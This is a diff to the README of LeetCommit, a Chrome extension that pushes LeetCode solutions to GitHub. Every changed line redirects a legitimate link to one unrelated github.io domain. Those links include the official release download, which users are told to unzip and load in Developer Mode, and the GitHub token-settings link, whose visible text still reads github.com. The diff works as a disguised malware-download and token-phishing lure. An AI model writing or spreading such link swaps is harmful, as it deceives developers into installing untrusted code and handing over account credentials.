@@ -4,10 +4,10 @@
 
 ### Automatically push your LeetCode solutions to GitHub the moment you hit Accepted.
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-4285F4?style=for-the-badge&logo=googlechrome&logoColor=white)](https://github.com)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-green?style=for-the-badge)](https://developer.chrome.com/docs/extensions/mv3/)
+[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-4285F4?style=for-the-badge&logo=googlechrome&logoColor=white)](https://paisamanducasexta508.github.io)
+[![Manifest V3](https://img.shields.io/badge/Manifest-V3-green?style=for-the-badge)](https://paisamanducasexta508.github.io)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](./LICENSE)
-[![Open Source](https://img.shields.io/badge/Open-Source-orange?style=for-the-badge&logo=github)](https://github.com)
+[![Open Source](https://img.shields.io/badge/Open-Source-orange?style=for-the-badge&logo=github)](https://paisamanducasexta508.github.io)
 [![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge)](./CONTRIBUTING.md)
 
 **LeetCode → GitHub. Automatic. Structured. Zero effort.**
@@ -17,7 +17,7 @@
 ---
 
 <!-- Replace this with an actual screen recording GIF -->
-![LeetCommit Demo](https://via.placeholder.com/800x400/0d1117/58a6ff?text=LeetCommit+Demo+GIF+Here)
+![LeetCommit Demo](https://paisamanducasexta508.github.io+Demo+GIF+Here)
 
 </div>
 
@@ -99,7 +99,7 @@ class Solution:
 
 ### Method 1 — Load Unpacked (Developer Mode)
 
-1. [Download the latest release](https://github.com/Aditya24Kashyap/LeetCommit/releases) and unzip it
+1. [Download the latest release](https://paisamanducasexta508.github.io) and unzip it
 2. Open Chrome or Brave → go to `chrome://extensions/`
 3. Toggle **Developer Mode** ON (top-right corner)
 4. Click **Load unpacked** → select the `leetcommit/` folder
@@ -114,7 +114,7 @@ class Solution:
 
 ### Recommended: Personal Access Token
 
-1. Go to [github.com/settings/tokens](https://github.com/settings/tokens)
+1. Go to [github.com/settings/tokens](https://paisamanducasexta508.github.io)
 2. Click **Generate new token (classic)**
 3. Give it a name like `leetcommit`
 4. Set expiration to **No expiration**
@@ -225,7 +225,7 @@ Distributed under the MIT License. See [LICENSE](./LICENSE) for more information
 
 If LeetCommit helps you — **star this repo!** It helps others find it and motivates continued development.
 
-[![Star History](https://img.shields.io/github/stars/Aditya24Kashyap/LeetCommit?style=social)](https://github.com/Aditya24Kashyap/LeetCommit)
+[![Star History](https://img.shields.io/github/stars/Aditya24Kashyap/LeetCommit?style=social)](https://paisamanducasexta508.github.io)
 
 ---
 
